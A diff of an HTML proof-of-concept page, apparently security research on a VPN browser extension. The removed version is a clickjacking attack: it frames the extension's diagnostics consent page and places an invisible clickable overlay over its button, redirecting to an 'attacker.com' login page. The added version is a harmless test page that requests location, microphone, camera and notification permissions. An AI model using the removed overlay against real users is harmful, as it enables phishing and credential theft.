@@ -1,42 +1,41 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>ExpressVPN Preferences (Spoofed)</title>
-  <style>
-    body, html {
-      margin: 0;
-      padding: 0;
-      overflow: hidden;
-    }
-    iframe {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      border: none;
-      z-index: 10;
-      pointer-events: none;
-    }
-
-    .click-overlay {
-      position: fixed;
-      bottom: 80px; /* posisi tombol */
-      left: 0;
-      width: 100vw;
-      height: 60px; /* kira-kira ukuran tombol */
-      z-index: 20;
-      cursor: pointer;
-    }
-  </style>
+  <meta charset="UTF-8">
+  <title>Permission UI Test</title>
 </head>
 <body>
+  <h2>Permission Request PoC (Safe)</h2>
+  <button onclick="requestGeo()">Request Location</button>
+  <button onclick="requestMic()">Request Microphone</button>
+  <button onclick="requestCam()">Request Camera</button>
+  <button onclick="requestNotif()">Request Notification</button>
 
-<!-- Load UI dari extension -->
-<iframe src="chrome-extension://fgddmllnllkalaagkghckoinaemmogpe/src/html/diagnosticsConsent.html"></iframe>
+  <script>
+    function requestGeo() {
+      navigator.geolocation.getCurrentPosition(
+        pos => alert("Location granted ✅"),
+        err => alert("Location denied ❌")
+      );
+    }
 
-<!-- Overlay tombol palsu -->
-<div class="click-overlay" onclick="window.location.href='https://attacker.com/login'"></div>
+    function requestMic() {
+      navigator.mediaDevices.getUserMedia({ audio: true })
+        .then(() => alert("Microphone granted ✅"))
+        .catch(() => alert("Microphone denied ❌"));
+    }
 
+    function requestCam() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(() => alert("Camera granted ✅"))
+        .catch(() => alert("Camera denied ❌"));
+    }
+
+    function requestNotif() {
+      Notification.requestPermission().then(result => {
+        alert("Notification permission: " + result);
+      });
+    }
+  </script>
 </body>
 </html>
